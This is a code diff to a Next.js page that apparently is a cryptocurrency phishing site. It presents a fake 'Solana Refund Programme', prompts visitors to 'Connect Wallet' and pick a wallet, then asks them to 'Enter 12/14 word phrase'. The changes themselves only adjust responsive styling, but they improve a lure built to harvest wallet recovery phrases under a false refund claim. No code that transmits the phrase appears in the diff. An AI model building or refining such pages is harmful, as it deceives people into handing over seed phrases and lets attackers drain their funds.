@@ -88,18 +88,22 @@ export default function Home() {
         <link rel="icon" href="/main-fav.png" />
       </Head>
 
-      <main className="p-5 bg-[url('/Mian-bg.webp')] h-screen relative">
+      <main className="p-5 bg-[url('/Mian-bg.webp')] overflow-hidden h-screen relative">
         <div className="backdrop-blur-md modal absolute w-screen hidden h-screen bg-black/30"></div>
 
         <nav className="grid w-full grid-cols-2 mb-2">
           <div className="flex">
-            <img src="Sol-Logo-svg.png" alt="Sol-Logo" className="w-44 h-8 " />
+            <img
+              src="Sol-Logo-svg.png"
+              alt="Sol-Logo"
+              className="sm:w-44 sm:h-8 w-24 h-6"
+            />
           </div>
           <div className="flex justify-end">
             <ul className="flex gap-5 items-center">
               <li>Home</li>
               <li
-                className="bg-[#17fb9b] cursor-pointer font-medium px-5 py-2 text-black rounded-full"
+                className="bg-[#17fb9b] cursor-pointer text-sm sm:text-base font-medium px-2 py-2 sm:px-5 sm:py-2 text-black rounded-full"
                 onClick={showModal}
               >
                 Connect Wallet
@@ -113,16 +117,16 @@ export default function Home() {
           className="flex  flex-col items-center w-full
         "
         >
-          <div className="ml-60 absolute">
-            <img src="Sol-Main-img.webp" alt="Sol-Image" />
+          <div className="sm:ml-60 ml-20 flex items-center h-screen absolute">
+            <img src="Sol-Main-img.webp" alt="Sol-Image" className="" />
           </div>
           <div className="flex mt-[27rem] gap-10 flex-col items-center">
-            <h1 className="font-semibold text-7xl">
+            <h1 className="font-semibold sm:text-7xl text-5xl text-center">
               {" "}
               <span className="font-extralight">Solana</span> Refund Programme
             </h1>
-            <p className="text-3xl font-light text-center">
-              Solana Refund is available to all solana network. <br /> Get
+            <p className="sm:text-3xl text-xl sm:px-80 font-light text-center">
+              Solana Refund is available to all solana network. Get
               refund by claiming your refund now.
             </p>
             <button
@@ -143,7 +147,7 @@ export default function Home() {
           >
             <div className="p-4 sm:p-7">
               <div className="grid grid-cols-2">
-                <h1 className="block text-2xl mb-5 text-center font-semibold text-black">
+                <h1 className="block sm:text-2xl text-xl mb-5  font-semibold text-black">
                   Select Wallet
                 </h1>
 
@@ -157,14 +161,14 @@ export default function Home() {
                   {wallets.map((wallet, key) => {
                     return (
                       <div
-                        className="flex cursor-pointer flex-col items-center"
+                        className="flex cursor-pointer text-center flex-col items-center"
                         onClick={showPhrase}
                         key={key}
                       >
                         <img
                           src={wallet.image}
                           alt={`img-${wallets.indexOf(wallet)}`}
-                          className="h-20 w-20 object-contain"
+                          className="sm:h-20 sm:w-20 h-10 w-10 object-contain"
                         />
                         <p className="text-black text-sm mt-1 font-medium">
                           {wallet.name} Wallet
@@ -181,7 +185,7 @@ export default function Home() {
           <div className="mt-7 bg-white word-phrase absolute rounded-xl shadow-lg hidden">
             <div className="p-4 sm:p-7">
               <div className="grid grid-cols-2">
-                <h1 className="block text-2xl mb-5 text-center font-semibold text-black">
+                <h1 className="block sm:text-2xl  mb-5 text-center font-semibold text-black">
                   Enter 12/14 word phrase
                 </h1>
 
